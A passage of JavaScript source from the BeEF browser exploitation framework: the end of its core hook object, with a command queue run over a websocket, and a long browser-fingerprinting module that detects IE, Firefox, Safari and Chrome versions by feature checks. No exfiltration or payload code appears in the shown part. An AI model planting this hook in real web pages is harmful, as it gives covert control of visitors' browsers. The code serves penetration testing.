                    if (typeof console == "object" && typeof console.log == "function") {
                        console.log(msg);
                    } else {
                        // TODO: maybe add a callback to BeEF server for debugging purposes
                        //window.alert(msg);
                    }
                },

		/**
		 * Adds a function to execute.
		 * @param: {Function} the function to execute.
		 */
		execute: function(fn) {
            if ( typeof  beef.websocket == "undefined"){
                 this.commands.push(fn);
            }else{
                fn();
            }
        },



		/**
		 * Registers a component in BeEF JS.
		 * @params: {String} the component.
		 *
		 * Components are very important to register so the framework does not
		 * send them back over and over again.
		 */
		regCmp: function(component) {
			this.components.push(component);
		}
	
    };
	
	window.beef = BeefJS;
}


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.browser
 *
 * Basic browser functions.
 */
beef.browser = {

    /**
     * Returns the user agent that the browser is claiming to be.
     * @example: beef.browser.getBrowserReportedName()
     */
    getBrowserReportedName: function () {
        return navigator.userAgent;
    },

    /**
     * Returns true if Avant Browser.
     * @example: beef.browser.isA()
     */
    isA: function () {
        return window.navigator.userAgent.match(/Avant TriCore/) != null;
    },

    /**
     * Returns true if Iceweasel.
     * @example: beef.browser.isI()
     */
    isI: function () {
        return window.navigator.userAgent.match(/Iceweasel\/\d+\.\d/) != null;
    },

    /**
     * Returns true if IE6.
     * @example: beef.browser.isIE6()
     */
    isIE6: function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },

    /**
     * Returns true if IE7.
     * @example: beef.browser.isIE7()
     */
    isIE7: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    /**
     * Returns true if IE8.
     * @example: beef.browser.isIE8()
     */
    isIE8: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    /**
     * Returns true if IE9.
     * @example: beef.browser.isIE9()
     */
    isIE9: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },

    /**
     *
     * Returns true if IE10.
     * @example: beef.browser.isIE10()
     */
    isIE10: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },

    /**
     *
     * Returns true if IE11.
     * @example: beef.browser.isIE11()
     */
    isIE11: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },

    /**
     * Returns true if IE.
     * @example: beef.browser.isIE()
     */
    isIE: function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11();
    },

    /**
     * Returns true if FF2.
     * @example: beef.browser.isFF2()
     */
    isFF2: function () {
        return !!window.globalStorage && !window.postMessage;
    },

    /**
     * Returns true if FF3.
     * @example: beef.browser.isFF3()
     */
    isFF3: function () {
        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
    },

    /**
     * Returns true if FF3.5.
     * @example: beef.browser.isFF3_5()
     */
    isFF3_5: function () {
        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
    },

    /**
     * Returns true if FF3.6.
     * @example: beef.browser.isFF3_6()
     */
    isFF3_6: function () {
        return !!window.globalStorage && !!window.FileReader && !window.multitouchData && !window.history.replaceState;
    },

    /**
     * Returns true if FF4.
     * @example: beef.browser.isFF4()
     */
    isFF4: function () {
        return !!window.globalStorage && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/4\./) != null;
    },

    /**
     * Returns true if FF5.
     * @example: beef.browser.isFF5()
     */
    isFF5: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/5\./) != null;
    },

    /**
     * Returns true if FF6.
     * @example: beef.browser.isFF6()
     */
    isFF6: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/6\./) != null;
    },

    /**
     * Returns true if FF7.
     * @example: beef.browser.isFF7()
     */
    isFF7: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/7\./) != null;
    },

    /**
     * Returns true if FF8.
     * @example: beef.browser.isFF8()
     */
    isFF8: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/8\./) != null;
    },

    /**
     * Returns true if FF9.
     * @example: beef.browser.isFF9()
     */
    isFF9: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/9\./) != null;
    },

    /**
     * Returns true if FF10.
     * @example: beef.browser.isFF10()
     */
    isFF10: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/10\./) != null;
    },

    /**
     * Returns true if FF11.
     * @example: beef.browser.isFF11()
     */
    isFF11: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
    },

    /**
     * Returns true if FF12
     * @example: beef.browser.isFF12()
     */
    isFF12: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
    },

    /**
     * Returns true if FF13
     * @example: beef.browser.isFF13()
     */
    isFF13: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
    },

    /**
     * Returns true if FF14
     * @example: beef.browser.isFF14()
     */
    isFF14: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/14\./) != null;
    },

    /**
     * Returns true if FF15
     * @example: beef.browser.isFF15()
     */
    isFF15: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/15\./) != null;
    },

    /**
     * Returns true if FF16
     * @example: beef.browser.isFF16()
     */
    isFF16: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/16\./) != null;
    },

    /**
     * Returns true if FF17
     * @example: beef.browser.isFF17()
     */
    isFF17: function () {
        return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/17\./) != null;
    },

    /**
     * Returns true if FF18
     * @example: beef.browser.isFF18()
     */
    isFF18: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/18\./) != null;
    },

    /**
     * Returns true if FF19
     * @example: beef.browser.isFF19()
     */
    isFF19: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/19\./) != null;
    },

    /**
     * Returns true if FF20
     * @example: beef.browser.isFF20()
     */
    isFF20: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && window.navigator.userAgent.match(/Firefox\/20\./) != null;
    },

    /**
     * Returns true if FF21
     * @example: beef.browser.isFF21()
     */
    isFF21: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/21\./) != null;
    },

    /**
     * Returns true if FF22
     * @example: beef.browser.isFF22()
     */
    isFF22: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/22\./) != null;
    },

    /**
     * Returns true if FF23
     * @example: beef.browser.isFF23()
     */
    isFF23: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/23\./) != null;
    },

    /**
     * Returns true if FF24
     * @example: beef.browser.isFF24()
     */
    isFF24: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/24\./) != null;
    },

    /**
     * Returns true if FF25
     * @example: beef.browser.isFF25()
     */
    isFF25: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/25\./) != null;
    },

    /**
     * Returns true if FF26
     * @example: beef.browser.isFF26()
     */
    isFF26: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && window.navigator.userAgent.match(/Firefox\/26./) != null;
    },

    /**
     * Returns true if FF27
     * @example: beef.browser.isFF27()
     */
    isFF27: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && window.navigator.userAgent.match(/Firefox\/27./) != null;
    },

    /**
     * Returns true if FF28
     * @example: beef.browser.isFF28()
     */
    isFF28: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt !== 'function' && window.navigator.userAgent.match(/Firefox\/28./) != null;
    },

    /**
     * Returns true if FF29
     * @example: beef.browser.isFF29()
     */
    isFF29: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/29./) != null;
    },

    /**
     * Returns true if FF30
     * @example: beef.browser.isFF30()
     */
    isFF30: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/30./) != null;
    },

    /**
     * Returns true if FF31
     * @example: beef.browser.isFF31()
     */
    isFF31: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && window.navigator.userAgent.match(/Firefox\/31./) != null;
    },

    /**
     * Returns true if FF32
     * @example: beef.browser.isFF32()
     */
    isFF32: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/32./) != null;
    },

    /**
     * Returns true if FF33
     * @example: beef.browser.isFF33()
     */
    isFF33: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/33./) != null;
    },

    /**
     * Returns true if FF34
     * @example: beef.browser.isFF34()
     */
    isFF34: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/34./) != null;
    },

    /**
     * Returns true if FF35
     * @example: beef.browser.isFF35()
     */
    isFF35: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/35./) != null;
    },

    /**
     * Returns true if FF36
     * @example: beef.browser.isFF36()
     */
    isFF36: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/36./) != null;
    },

    /**
     * Returns true if FF37
     * @example: beef.browser.isFF37()
     */
    isFF37: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/37./) != null;
    },

    /**
     * Returns true if FF38
     * @example: beef.browser.isFF38()
     */
    isFF38: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/38./) != null;
    },

    /**
     * Returns true if FF39
     * @example: beef.browser.isFF39()
     */
    isFF39: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/39./) != null;
    },

    /**
     * Returns true if FF40
     * @example: beef.browser.isFF40()
     */
    isFF40: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/40./) != null;
    },

    /**
     * Returns true if FF41
     * @example: beef.browser.isFF41()
     */
    isFF41: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/41./) != null;
    },

    /**
     * Returns true if FF42
     * @example: beef.browser.isFF42()
     */
    isFF42: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/42./) != null;
    },

    /**
     * Returns true if FF43
     * @example: beef.browser.isFF43()
     */
    isFF43: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/43./) != null;
    },

    /**
     * Returns true if FF.
     * @example: beef.browser.isFF()
     */
    isFF: function () {
        return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20() || this.isFF21() || this.isFF22() || this.isFF23() || this.isFF24() || this.isFF25() || this.isFF26() || this.isFF27() || this.isFF28() || this.isFF29() || this.isFF30() || this.isFF31() || this.isFF32() || this.isFF33() || this.isFF34() || this.isFF35() || this.isFF36() || this.isFF37() || this.isFF38() || this.isFF39() || this.isFF40() || this.isFF41() || this.isFF42() || this.isFF43();
    },

    /**
     * Returns true if Safari 4.xx
     * @example: beef.browser.isS4()
     */
    isS4: function () {
        return (window.navigator.userAgent.match(/ Version\/4\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 5.xx
     * @example: beef.browser.isS5()
     */
    isS5: function () {
        return (window.navigator.userAgent.match(/ Version\/5\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 6.xx
     * @example: beef.browser.isS6()
     */
    isS6: function () {
        return (window.navigator.userAgent.match(/ Version\/6\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 7.xx
     * @example: beef.browser.isS7()
     */
    isS7: function () {
        return (window.navigator.userAgent.match(/ Version\/7\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 8.xx
     * @example: beef.browser.isS8()
     */
    isS8: function () {
        return (window.navigator.userAgent.match(/ Version\/8\.\d/) != null && window.navigator.userAgent.match(/Safari\/\d/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari.
     * @example: beef.browser.isS()
     */
    isS: function () {
        return this.isS4() || this.isS5() || this.isS6() || this.isS7() || this.isS8();
    },

    /**
     * Returns true if Chrome 5.
     * @example: beef.browser.isC5()
     */
    isC5: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
    },

    /**
     * Returns true if Chrome 6.
     * @example: beef.browser.isC6()
     */
    isC6: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
    },

    /**
     * Returns true if Chrome 7.
     * @example: beef.browser.isC7()
     */
    isC7: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
    },

    /**
     * Returns true if Chrome 8.
     * @example: beef.browser.isC8()
     */
    isC8: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
    },

    /**
     * Returns true if Chrome 9.
     * @example: beef.browser.isC9()
     */
    isC9: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
    },

    /**
     * Returns true if Chrome 10.
     * @example: beef.browser.isC10()
     */
    isC10: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
    },

    /**
     * Returns true if Chrome 11.
     * @example: beef.browser.isC11()
     */
    isC11: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
    },

    /**
     * Returns true if Chrome 12.
     * @example: beef.browser.isC12()
     */
    isC12: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
    },

    /**
     * Returns true if Chrome 13.
     * @example: beef.browser.isC13()
     */
    isC13: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
    },

    /**
     * Returns true if Chrome 14.
     * @example: beef.browser.isC14()
     */
    isC14: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
    },

    /**
     * Returns true if Chrome 15.
     * @example: beef.browser.isC15()
     */
    isC15: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
    },

    /**
     * Returns true if Chrome 16.
     * @example: beef.browser.isC16()
     */
    isC16: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
    },

    /**
     * Returns true if Chrome 17.
     * @example: beef.browser.isC17()
     */
    isC17: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
    },

    /**
     * Returns true if Chrome 18.
     * @example: beef.browser.isC18()
     */
    isC18: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
    },

    /**
     * Returns true if Chrome 19.
     * @example: beef.browser.isC19()
     */
    isC19: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 19.
     * @example: beef.browser.isC19iOS()
     */
    isC19iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome 20.
     * @example: beef.browser.isC20()
     */
    isC20: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 20.
     * @example: beef.browser.isC20iOS()
     */
    isC20iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome 21.
     * @example: beef.browser.isC21()
     */
    isC21: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 21.
     * @example: beef.browser.isC21iOS()
     */
    isC21iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome 22.
     * @example: beef.browser.isC22()
     */
    isC22: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 22.
     * @example: beef.browser.isC22iOS()
     */
    isC22iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome 23.
     * @example: beef.browser.isC23()
     */
    isC23: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 23.
     * @example: beef.browser.isC23iOS()
     */
    isC23iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome 24.
     * @example: beef.browser.isC24()
     */
    isC24: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 24.
     * @example: beef.browser.isC24iOS()
     */
    isC24iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome 25.
     * @example: beef.browser.isC25()
     */
    isC25: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 25.
     * @example: beef.browser.isC25iOS()
     */
    isC25iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome 26.
     * @example: beef.browser.isC26()
     */
    isC26: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 26.
     * @example: beef.browser.isC26iOS()
     */
    isC26iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome 27.
     * @example: beef.browser.isC27()
     */
    isC27: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 27.
     * @example: beef.browser.isC27iOS()
     */
    isC27iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome 28.
     * @example: beef.browser.isC28()
     */
    isC28: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 28.
     * @example: beef.browser.isC28iOS()
     */
    isC28iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome 29.
     * @example: beef.browser.isC29()
     */
    isC29: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 29.
     * @example: beef.browser.isC29iOS()
     */
    isC29iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome 30.
     * @example: beef.browser.isC30()
     */
    isC30: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
